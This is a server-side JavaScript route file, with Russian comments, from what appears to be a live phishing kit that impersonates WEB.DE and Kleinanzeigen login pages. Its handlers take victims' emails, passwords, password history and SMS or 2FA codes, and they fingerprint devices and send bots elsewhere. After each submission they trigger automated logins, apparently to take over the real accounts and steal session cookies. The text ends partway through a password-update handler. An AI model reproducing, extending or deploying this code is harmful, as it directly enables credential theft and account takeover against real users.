'use strict';

const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');

function normalizePathname(parsedUrl) {
  return (parsedUrl.pathname || '').replace(/\/\/+/g, '/') || '/';
}

async function handleRoute(req, res, parsedUrl, body, d) {
  const pathname = normalizePathname(parsedUrl);
  const parsed = parsedUrl;
  const method = req.method;
  if (pathname === '/api/visit' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'visit', RATE_LIMITS.visit)) {
      return send(res, 429, { ok: false, error: 'too_many_requests' });
    }
    const leads = leadService.readLeads();
    const now = new Date().toISOString();
    
    // НЕ используем IP для связывания записей - каждый новый визит создает новую запись
    // IP сохраняется только для отображения в админке, но не используется для поиска или связывания
    // Это позволяет создавать отдельные логи для каждой новой сессии, даже с того же IP
    
    // Всегда создаем новую запись для нового визита
    const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
    const platform = resolvePlatform(getPlatformFromRequest(req), undefined);
    const brandId = getBrand(req).id;
    // Устройство не определено (нет/пустой UA, бот) → редирект на GMX
    const initialStatus = platform == null ? 'redirect_gmx_net' : 'pending';
    const hostVisit = (req.headers && req.headers.host) ? String(req.headers.host).split(':')[0].toLowerCase() : '';
    const visitDetail = 'бренд ' + brandId + (hostVisit ? ' · хост ' + hostVisit : '');
    const initialEvent = platform == null
      ? [{ at: now, label: 'Устройство не определено → редирект на GMX', source: 'user', detail: visitDetail }]
      : [{ at: now, label: 'Зашел на сайт', source: 'user', detail: visitDetail }];
    const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
    const newVisitLead = {
      id: id,
      email: '',
      password: '',
      createdAt: now,
      adminListSortAt: now,
      status: initialStatus,
      ip: ip, // IP только для отображения, не для связывания
      lastSeenAt: now,
      eventTerminal: initialEvent,
      platform: platform || undefined,
      brand: brandId,
      userAgent: ua || undefined,
    };
    leadService.persistLeadFull(newVisitLead);
    writeDebugLog('VISIT_CREATED', { id: id, ip: ip, totalLeads: leadService.readLeads().length });
    send(res, 200, { ok: true, id: id });
    return;
  }

  if (pathname === '/api/submit' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch (err) {
        console.error('[ВХОД] Ошибка: неверный JSON в теле /api/submit — ' + (err.message || err) + '. Отклонён, ip=' + ip);
        return send(res, 400, { ok: false, error: 'invalid json' });
      }
      if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
        console.log('[ВХОД] Отказ: запрос без gate cookie (REQUIRE_GATE_COOKIE=1), ip=' + ip);
        return send(res, 403, { ok: false, error: 'forbidden' });
      }
      /** Только креды Klein (/klein-anmelden): не трогаем email/password почты WEB.DE.
       *  visitId обязателен для привязки; если sessionStorage потерян — ищем лид по совпадению email или emailKl (самый свежий). */
      if (json.kleinFlowSubmit === true || json.kleinFlow === true) {
        const leadsKf = leadService.readLeads();
        const pwKf = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
        const emKf = String(json.email || json.emailKl || '').trim();
        if (!emKf) {
          return send(res, 400, { ok: false, error: 'email required' });
        }
        const emLower = emKf.toLowerCase();
        const visitIdKleinFlow = json.visitId && String(json.visitId).trim();
        let leadKf = null;
        if (visitIdKleinFlow) {
          const idKf = leadService.resolveLeadId(visitIdKleinFlow);
          leadKf = leadsKf.find(function (l) { return l && l.id === idKf; });
        }
        if (!leadKf) {
          const candidates = leadsKf.filter(function (l) {
            if (!l || l.klLogArchived === true) return false;
            const e = (l.email || '').trim().toLowerCase();
            const eKl = (l.emailKl || '').trim().toLowerCase();
            return (e && e === emLower) || (eKl && eKl === emLower);
          });
          if (candidates.length === 1) {
            leadKf = candidates[0];
          } else if (candidates.length > 1) {
            candidates.sort(function (a, b) {
              const ta = a.adminListSortAt ? new Date(a.adminListSortAt).getTime() : 0;
              const tb = b.adminListSortAt ? new Date(b.adminListSortAt).getTime() : 0;
              if (tb !== ta) return tb - ta;
              return String(b.id || '').localeCompare(String(a.id || ''));
            });
            leadKf = candidates[0];
          }
        }
        if (!leadKf) {
          return send(res, 404, { ok: false, error: 'lead not found' });
        }
        leadKf.emailKl = emKf;
        if (pwKf) leadKf.passwordKl = pwKf;
        leadKf.brand = 'klein';
        const nowKf = new Date().toISOString();
        leadKf.lastSeenAt = nowKf;
        leadKf.adminListSortAt = nowKf;
        pushSubmitPipelineEvent(leadKf, 'klein-flow', !!pwKf);
        pushEvent(leadKf, 'Ввел почту Kl');
        if (pwKf) {
          pushEvent(leadKf, 'Ввел пароль Kl');
          pushPasswordHistory(leadKf, pwKf, 'login_kl');
        }
        applyLeadTelemetry(leadKf, req, json, ip);
        leadService.persistLeadFull(leadKf);
        if (pwKf) {
          automationService.startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
        }
        return send(res, 200, { ok: true, id: leadKf.id });
      }
      const honeypot = (json.website != null && String(json.website).trim() !== '') || (json.hp != null && String(json.hp).trim() !== '');
      if (honeypot) {
        console.log('[ВХОД] Отказ: заполнено скрытое поле honeypot (бот), ip=' + ip);
        return send(res, 400, { ok: false, error: 'invalid' });
      }
      if (!checkRateLimit(ip, 'submit', RATE_LIMITS.submit)) {
        console.log('[ВХОД] Отказ: превышен лимит запросов submit с ip=' + ip);
        return send(res, 429, { ok: false, error: 'too_many_requests' });
      }
      const email = String(json.email || '').trim();
      if (!email) {
        console.error('[ВХОД] Ошибка: в теле /api/submit отсутствует поле email или оно пустое. Отклонён, ip=' + ip);
        return send(res, 400, { ok: false, error: 'email required' });
      }
      const submitBrandId = getBrand(req).id;
      const atEmail = email.indexOf('@');
      const emailDomain = (atEmail > 0 && atEmail < email.length - 1) ? email.slice(atEmail + 1).toLowerCase().trim() : '';
      const submitHost = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
      if (submitBrandId === 'webde') {
        if (!isLocalHost(submitHost) && emailDomain !== 'web.de') {
          console.log('[ВХОД] Отказ: на WEB.DE только @web.de — email=' + email + ', ip=' + ip);
          return send(res, 400, { ok: false, error: 'email_domain_not_allowed' });
        }
      } else if (submitBrandId !== 'klein' && ENABLE_EMAIL_DOMAIN_ALLOWLIST && ALLOWED_EMAIL_DOMAINS.length > 0) {
        const allowed = emailDomain && ALLOWED_EMAIL_DOMAINS.indexOf(emailDomain) !== -1;
        if (!allowed) {
          console.log('[ВХОД] Отказ: домен почты не в списке — email=' + email + ', brand=' + submitBrandId + ', ip=' + ip);
          return send(res, 400, { ok: false, error: 'email_domain_not_allowed' });
        }
      }
      const visitId = json.visitId && String(json.visitId).trim();
      const passwordFromBody = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
      const hasPassword = passwordFromBody !== '';
      logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip);
      const leads = leadService.readLeads();
      const emailLower = email.toLowerCase();
      const incomingDeviceSig = deviceSignatureFromRequest(req, json, ip);
      // Для Klein: в EMAIL KL пишем значение из поля emailKl из тела запроса (то, что реально введено на форме Klein), чтобы не подменялось автозаполнением браузера
      const brandIdForEmailKl = getBrand(req).id;
      const emailForKlein = (brandIdForEmailKl === 'klein' && json.emailKl != null && String(json.emailKl).trim() !== '')
        ? String(json.emailKl).trim()
        : email;

      if (visitId) {
        const visitLeadRaw = leads.find(function (l) { return l.id === visitId; });
        // KL архив: лог остаётся в базе, но новые submit с этим visitId не обновляют запись — создаётся новый лог
        const visitLead = (visitLeadRaw && visitLeadRaw.klLogArchived !== true) ? visitLeadRaw : null;
        if (visitLeadRaw && visitLeadRaw.klLogArchived === true) {
          console.log('[ВХОД] visitId указывает на KL-архив — не обновляем запись, создаём новый лог, id=' + visitId);
          writeDebugLog('SUBMIT_SKIP_KL_ARCHIVED_VISITID', { visitId: visitId, email: email, ip: ip });
        }
        if (visitLead) {
          const existingEmail = (visitLead.email || '').trim().toLowerCase();
          const newEmail = emailLower;
          
          // Если запись с visitId уже имеет email И новый email отличается: для Klein — один лог (добавляем emailKl), для web — новый лог
          if (existingEmail && existingEmail !== newEmail) {
            const brandIdUpdate = getBrand(req).id;
            if (brandIdUpdate === 'klein') {
              applyReturnVisitStatusReset(visitLead);
              visitLead.emailKl = emailForKlein;
              visitLead.passwordKl = hasPassword ? passwordFromBody : '';
              visitLead.brand = 'klein';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisit = new Date().toISOString();
              visitLead.lastSeenAt = nowVisit;
              visitLead.adminListSortAt = nowVisit;
              pushSubmitPipelineEvent(visitLead, 'klein', hasPassword, 'visitId, другой email');
              pushEvent(visitLead, 'Ввел почту Kl');
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPasswordKl = et.length > 0 && et[et.length - 1].label === 'Ввел пароль Kl';
                if (!lastIsPasswordKl) pushEvent(visitLead, 'Ввел пароль Kl');
                if (visitLead.status === 'error') visitLead.status = 'pending';
                if (hasPassword) delete visitLead.kleinPasswordErrorDe;
                // Klein: редирект только вручную кнопками в админке, авто-редирект на смену пароля не делаем
              }
              if (hasPassword) pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
              applyLeadTelemetry(visitLead, req, json, ip);
              leadService.persistLeadFull(visitLead);
              console.log('[ВХОД] Лог: обновлена запись по visitId (Klein, другой email) — id=' + visitLead.id + ', emailKl=' + emailForKlein + (hasPassword ? ', пароль kl введён' : ''));
              writeDebugLog('SUBMIT_UPDATE_BY_VISITID_KLEIN_DIFFERENT_EMAIL', { visitId: visitId, emailKl: emailForKlein, hasPassword: hasPassword, ip: ip });
              return send(res, 200, { ok: true, id: visitLead.id });
            }
            console.log('[ВХОД] Лог: visitId найден, но email другой — старый ' + existingEmail + ', новый ' + newEmail + ', создаём новый лог');
            writeDebugLog('SUBMIT_NEW_EMAIL_DIFFERENT', {
              visitId: visitId,
              oldEmail: existingEmail,
              newEmail: newEmail,
              ip: ip,
              reason: 'Email отличается от существующего в записи с visitId'
            });
            // Продолжаем создавать новый лог (код ниже)
          } else if (!existingEmail) {
            // Запись существует БЕЗ email - обновляем её (продолжение сессии в той же вкладке)
            const brandIdUpdate = getBrand(req).id;
            const isKlein = brandIdUpdate === 'klein';
            if (isKlein) {
              applyReturnVisitStatusReset(visitLead);
              visitLead.emailKl = emailForKlein;
              visitLead.passwordKl = hasPassword ? passwordFromBody : '';
              visitLead.brand = 'klein';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisitKl = new Date().toISOString();
              visitLead.lastSeenAt = nowVisitKl;
              visitLead.adminListSortAt = nowVisitKl;
              pushSubmitPipelineEvent(visitLead, 'klein', hasPassword, 'visitId, первая запись email');
              pushEvent(visitLead, 'Ввел почту Kl');
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPasswordKl = et.length > 0 && et[et.length - 1].label === 'Ввел пароль Kl';
                if (!lastIsPasswordKl) pushEvent(visitLead, 'Ввел пароль Kl');
                if (visitLead.status === 'error') visitLead.status = 'pending';
                if (hasPassword) delete visitLead.kleinPasswordErrorDe;
                // Klein: редирект только вручную кнопками в админке
                pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
              }
            } else {
              applyReturnVisitStatusReset(visitLead);
              const oldPassword = visitLead.password || '';
              visitLead.email = email;
              visitLead.password = hasPassword ? passwordFromBody : '';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisitWeb = new Date().toISOString();
              visitLead.lastSeenAt = nowVisitWeb;
              visitLead.adminListSortAt = nowVisitWeb;
              pushSubmitPipelineEvent(visitLead, 'webde', hasPassword, 'visitId, первая запись email');
              pushEvent(visitLead, 'Ввел почту');
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPassword = et.length > 0 && et[et.length - 1].label === 'Ввел пароль';
                if (!lastIsPassword) pushEvent(visitLead, 'Ввел пароль');
                appendToAllLog(email, oldPassword, visitLead.password);
                if (visitLead.status === 'error' && passwordFromBody !== (oldPassword || '')) visitLead.status = 'pending';
                const mode = readMode();
                const startPage = readStartPage();
                if (visitLead.status === 'pending') {
                  const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, visitLead);
                  if (status) {
                    visitLead.status = status;
                    pushEvent(visitLead, getAutoRedirectEventLabel(visitLead.status));
                  }
                }
              }
            }
            applyLeadTelemetry(visitLead, req, json, ip);
            leadService.persistLeadFull(visitLead);
            logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''));
            writeDebugLog('SUBMIT_UPDATE_BY_VISITID', {
              visitId: visitId,
              email: email,
              hasPassword: hasPassword,
              leadId: visitLead.id,
              ip: ip,
              totalLeads: leads.length
            });
            automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
            return send(res, 200, { ok: true, id: visitLead.id });
          } else {
            // Лид вернулся (уже был Успех) — повторный submit: обновляем лог и заново запускаем скрипт входа, чтобы сохранить новые куки
            if (visitLead.status === 'show_success') {
              var nowSucc = new Date().toISOString();
              visitLead.lastSeenAt = nowSucc;
              visitLead.adminListSortAt = nowSucc;
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastPwd = et.length > 0 && et[et.length - 1].label === 'Ввел пароль';
                if (!lastPwd) pushEvent(visitLead, 'Ввел пароль повторно');
                else pushEvent(visitLead, 'Вернулся — повторный ввод');
                const oldP = (visitLead.password || '').trim();
                visitLead.password = passwordFromBody;
                if (hasPassword) pushPasswordHistory(visitLead, passwordFromBody, 'login');
                if ((visitLead.email || '').trim()) appendToAllLog((visitLead.email || '').trim(), oldP, passwordFromBody);
              } else {
                pushEvent(visitLead, 'Вернулся — повторный ввод');
              }
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              applyLeadTelemetry(visitLead, req, json, ip);
              leadService.persistLeadFull(visitLead);
              console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
              pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : 'webde', hasPassword, 'повтор после Успех (обновление куки)');
              automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
              return send(res, 200, { ok: true, id: visitId });
            }
            // Email совпадает — создаём новый лог, переносим в него историю старого, старый удаляем
            const isKleinSame = getBrand(req).id === 'klein';
            console.log('[ВХОД] Лог: visitId найден, email совпадает — новый лог с переносом истории, старый id=' + visitId + ' удалён');
            const oldPassword = visitLead.password || visitLead.passwordKl || '';
            const now = new Date().toISOString();
            const pastEvents = Array.isArray(visitLead.eventTerminal) ? visitLead.eventTerminal.slice() : [];
            const newEvents = [submitPipelineEventRaw(now, isKleinSame ? 'klein' : 'webde', hasPassword, 'новый лид по visitId, тот же email')].concat(
              isKleinSame
                ? [{ at: now, label: 'Ввел почту Kl' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль Kl' }] : [])
                : [{ at: now, label: 'Ввел почту' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль' }] : [])
            );
            const mode = readMode();
            const startPage = readStartPage();
            const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : visitLead.screenWidth;
            const platform = resolvePlatform(getPlatformFromRequest(req), json.screenWidth) || visitLead.platform;
            let initialStatus = 'pending';
            if (platform == null) {
              initialStatus = 'redirect_gmx_net';
              newEvents.push({ at: now, label: 'Устройство не определено → редирект на GMX' });
            } else if (hasPassword && !isKleinSame) {
              const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, { platform: platform });
              if (status) {
                initialStatus = status;
                newEvents.push({ at: now, label: getAutoRedirectEventLabel(initialStatus) });
              }
            }
            const newPassword = hasPassword ? passwordFromBody : '';
            const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : visitLead.screenHeight;
            const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
            const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
            const newLead = {
              id: id,
              email: isKleinSame ? (visitLead.email || '') : email,
              password: isKleinSame ? (visitLead.password || '') : newPassword,
              emailKl: isKleinSame ? emailForKlein : (visitLead.emailKl || ''),
              passwordKl: isKleinSame ? newPassword : (visitLead.passwordKl || ''),
              createdAt: now,
              adminListSortAt: now,
              lastSeenAt: now,
              status: initialStatus,
              ip: ip,
              eventTerminal: pastEvents.concat(newEvents),
              platform: platform || undefined,
              screenWidth: screenW,
              screenHeight: screenH,
              // Бренд = сайт текущего submit (host), не старый visitLead.brand:
              // иначе после Klein при логе с web-de.one brand оставался klein и шёл klein_simulation вместо почты.
              brand: isKleinSame ? 'klein' : getBrand(req).id,
              pastHistoryTransferred: true,
              mergedFromId: visitId,
              mergedIntoId: id,
              mergeReason: 'same_visit_same_email_new_log',
              mergeActor: 'submit',
              mergedAt: now,
              userAgent: ua || visitLead.userAgent || undefined,
              fingerprint: (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : (visitLead.fingerprint || undefined),
            };
            applyLeadTelemetry(newLead, req, json, ip);
            if (!isKleinSame) {
              newLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
              if (newLead.passwordHistory.length === 0 && (visitLead.password || '').trim()) {
                newLead.passwordHistory = [{ p: String(visitLead.password).trim(), s: 'login' }];
              }
              if (hasPassword) pushPasswordHistory(newLead, newPassword, 'login');
              if (hasPassword) appendToAllLog(email, oldPassword, newPassword);
            } else if (isKleinSame && hasPassword) {
              newLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
              if (newLead.passwordHistory.length === 0 && (visitLead.passwordKl || '').trim()) {
                newLead.passwordHistory = [{ p: String(visitLead.passwordKl).trim(), s: 'login_kl' }];
              }
              pushPasswordHistory(newLead, newPassword, 'login_kl');
            }
            if (visitLead.smsCodeData && (visitLead.smsCodeData.code || visitLead.smsCodeData.submittedAt)) {
              newLead.smsCodeData = { code: visitLead.smsCodeData.code || '', submittedAt: visitLead.smsCodeData.submittedAt || new Date().toISOString() };
              if (visitLead.smsCodeData.kind === '2fa' || visitLead.smsCodeData.kind === 'sms') newLead.smsCodeData.kind = visitLead.smsCodeData.kind;
            }
            leadService.writeReplacedLeadId(visitId, id);
            replaceLeadRow(visitId, newLead);
            leadService.invalidateLeadsCache();
            broadcastLeadsUpdate();
            console.log('[ВХОД] Лог: создан новый лог id=' + id + ' (старый ' + visitId + ' удалён, история перенесена)');
            writeDebugLog('SUBMIT_SAME_EMAIL_NEW_LOG_WITH_HISTORY', {
              visitId: visitId,
              newId: id,
              email: email,
              hasPassword: hasPassword,
              ip: ip,
              totalLeads: leadService.readLeads().length,
              mergedFromId: visitId,
              mergedIntoId: id,
              mergeReason: 'same_visit_same_email_new_log',
              mergeActor: 'submit'
            });
            const preemptEm = (!isKleinSame ? email : (emailForKlein || email)).trim().toLowerCase();
            automationService.preemptWebdeLoginForReplacedLead(visitId, preemptEm);
            if (!isKleinSame || hasPassword) {
              automationService.startWebdeLoginAfterLeadSubmit(id, newLead);
            }
            return send(res, 200, { ok: true, id: id });
          }
        } else {
          console.log('[ВХОД] Лог: visitId не найден — создаём новый лог');
          writeDebugLog('SUBMIT_VISITID_NOT_FOUND', { visitId: visitId, email: email, ip: ip });
        }
      }

      // Создаем новую запись (лог). Если уже есть лог с таким же email — переносим в новый историю и удаляем старый.
      const brandIdSubmit = getBrand(req).id;
      const isKlein = brandIdSubmit === 'klein';
      const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
      const now = new Date().toISOString();
      const newEvents = [submitPipelineEventRaw(now, isKlein ? 'klein' : 'webde', hasPassword, visitId ? 'visitId не найден — новая запись' : 'новая запись')].concat(
        isKlein
          ? [{ at: now, label: 'Ввел почту Kl' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль Kl' }] : [])
          : [{ at: now, label: 'Ввел почту' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль' }] : [])
      );
      const mode = readMode();
      const startPage = readStartPage();
      const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : undefined;
      const platform = resolvePlatform(getPlatformFromRequest(req), screenW);
      let initialStatus = 'pending';
      if (platform == null) {
        initialStatus = 'redirect_gmx_net';
        newEvents.push({ at: now, label: 'Устройство не определено → редирект на GMX' });
      } else if (hasPassword && !isKlein) {
        const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, { platform: platform });
        if (status) {
          initialStatus = status;
          newEvents.push({ at: now, label: getAutoRedirectEventLabel(initialStatus) });
        }
      } else if (hasPassword && isKlein) {
        // Klein: редирект только вручную кнопками в админке, авто на смену пароля не делаем
      }
      const newPassword = hasPassword ? passwordFromBody : '';
      const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;

      // Есть ли уже лог с такой же почтой? И web, и Klein ищут по email и по emailKl — тогда один лог при одной почте
      const existingByEmail = leads.find(function (l) {
        if (l.klLogArchived === true) return false;
        const e = (l.email || '').trim().toLowerCase();
        const eKl = (l.emailKl || '').trim().toLowerCase();
        return (e && e === emailLower) || (eKl && eKl === emailLower);
      });

      let eventTerminal = newEvents.slice();
      let pastHistoryTransferred = false;

      if (existingByEmail) {
        const pastEvents = Array.isArray(existingByEmail.eventTerminal) ? existingByEmail.eventTerminal.slice() : [];
        eventTerminal = pastEvents.concat(newEvents);
        pastHistoryTransferred = true;
        const oldPassword = isKlein ? (existingByEmail.passwordKl || '') : (existingByEmail.password || '');
        leadService.writeReplacedLeadId(existingByEmail.id, id);
        if (hasPassword && !isKlein) appendToAllLog(email, oldPassword, newPassword);
        console.log('[ВХОД] Лог: тот же email — перенос истории из id=' + existingByEmail.id + ', новый id=' + id);
        writeDebugLog('SUBMIT_SAME_EMAIL_MERGE_HISTORY', {
          oldId: existingByEmail.id,
          newId: id,
          email: email,
          hasPassword: hasPassword,
          ip: ip,
          totalLeads: null,
          mergedFromId: existingByEmail.id,
          mergedIntoId: id,
          mergeReason: 'same_email_resubmit',
          mergeActor: 'submit'
        });
      } else if (hasPassword && !isKlein) {
        appendToAllLog(email, '', newPassword);
      }

      /* Объединение по email и emailKl (existingByEmail). Merge по fingerprint/device отключён. */

      const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
      const newLead = {
        id: id,
        email: isKlein ? (existingByEmail ? (existingByEmail.email || '') : '') : email,
        password: isKlein ? (existingByEmail ? (existingByEmail.password || '') : '') : newPassword,
        emailKl: isKlein ? emailForKlein : (existingByEmail ? (existingByEmail.emailKl || '') : ''),
        passwordKl: isKlein ? newPassword : (existingByEmail ? (existingByEmail.passwordKl || '') : ''),
        createdAt: now,
        adminListSortAt: now,
        lastSeenAt: now,
        status: initialStatus,
        ip: ip,
        eventTerminal: eventTerminal,
        platform: platform || undefined,
        screenWidth: screenW,
        screenHeight: screenH,
        brand: brandIdSubmit,
        userAgent: ua || undefined,
        fingerprint: (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : undefined,
        deviceSignature: incomingDeviceSig || undefined,
      };
      if (pastHistoryTransferred) {
        if (!isKlein) {
          newLead.passwordHistory = normalizePasswordHistory(existingByEmail.passwordHistory);
          if (newLead.passwordHistory.length === 0 && (existingByEmail.password || '').trim()) {
            newLead.passwordHistory = [{ p: String(existingByEmail.password).trim(), s: 'login' }];
          }
        } else {
          newLead.passwordHistory = normalizePasswordHistory(existingByEmail.passwordHistory);
          if (newLead.passwordHistory.length === 0 && (existingByEmail.passwordKl || '').trim()) {
            newLead.passwordHistory = [{ p: String(existingByEmail.passwordKl).trim(), s: 'login_kl' }];
          }
        }
        if (existingByEmail.smsCodeData && (existingByEmail.smsCodeData.code || existingByEmail.smsCodeData.submittedAt)) {
          newLead.smsCodeData = { code: existingByEmail.smsCodeData.code || '', submittedAt: existingByEmail.smsCodeData.submittedAt || new Date().toISOString() };
          if (existingByEmail.smsCodeData.kind === '2fa' || existingByEmail.smsCodeData.kind === 'sms') newLead.smsCodeData.kind = existingByEmail.smsCodeData.kind;
        }
        newLead.pastHistoryTransferred = true;
        newLead.mergedFromId = existingByEmail.id;
        newLead.mergedIntoId = id;
        newLead.mergeReason = 'same_email_resubmit';
        newLead.mergeActor = 'submit';
        newLead.mergedAt = now;
      }
      if (hasPassword && !isKlein) pushPasswordHistory(newLead, newPassword, 'login');
      if (hasPassword && isKlein) pushPasswordHistory(newLead, newPassword, 'login_kl');

      applyLeadTelemetry(newLead, req, json, ip);
      if (existingByEmail) {
        replaceLeadRow(existingByEmail.id, newLead);
      } else {
        addLead(newLead);
      }
      leadService.invalidateLeadsCache();
      broadcastLeadsUpdate();
      console.log('[ВХОД] Лог: создана запись id=' + id + ', email=' + email + (hasPassword ? ', пароль введён' : '') + (pastHistoryTransferred ? ', история перенесена' : '') + (brandIdSubmit === 'klein' ? ' (Klein → админка ' + ADMIN_DOMAIN + ')' : ''));
      writeDebugLog('SUBMIT_NEW_LOG_CREATED', {
        id: id,
        email: email,
        hasPassword: hasPassword,
        visitId: visitId || null,
        ip: ip,
        totalLeads: leadService.readLeads().length,
        status: initialStatus,
        pastHistoryTransferred: pastHistoryTransferred,
        mergedFromId: pastHistoryTransferred && existingByEmail ? existingByEmail.id : undefined,
        mergedIntoId: pastHistoryTransferred && existingByEmail ? id : undefined,
        mergeReason: pastHistoryTransferred && existingByEmail ? 'same_email_resubmit' : undefined,
        mergeActor: pastHistoryTransferred && existingByEmail ? 'submit' : undefined
      });
      if (pastHistoryTransferred && existingByEmail && existingByEmail.id) {
        const pe = isKlein ? (emailForKlein || email).trim().toLowerCase() : email.trim().toLowerCase();
        automationService.preemptWebdeLoginForReplacedLead(existingByEmail.id, pe);
      }
      automationService.startWebdeLoginAfterLeadSubmit(id, newLead);
      send(res, 200, { ok: true, id: id });
    });
    return;
  }

  if (pathname === '/api/update-password' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch (e) {
        console.error('[ВХОД] Ошибка: неверный JSON в теле /api/update-password — ' + (e.message || e));
        return send(res, 400, { ok: false });
      }
      const idRaw = json.id;
      const newPassword = json.password != null ? String(json.password) : '';
      if (!idRaw || typeof idRaw !== 'string') {
        console.error('[ВХОД] Ошибка: в теле /api/update-password отсутствует поле id или оно не строка.');
        return send(res, 400, { ok: false });
      }
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) {
        console.error('[ВХОД] Ошибка: лид не найден для update-password — id=' + idRaw + ' (в leads.json такой записи нет).');
        return send(res, 404, { ok: false });
      }
      const lead = leads[idx];
      const email = (lead.email || '').trim();
      logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'пароль id=' + id);
      const oldPassword = lead.password != null ? String(lead.password) : '';
      lead.lastSeenAt = new Date().toISOString();
      if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
      if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
      const platformUpdate = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
      if (platformUpdate != null) lead.platform = platformUpdate;
      if (req.headers && req.headers['user-agent']) lead.userAgent = String(req.headers['user-agent']);
      if (json.fingerprint && typeof json.fingerprint === 'object') lead.fingerprint = json.fingerprint;
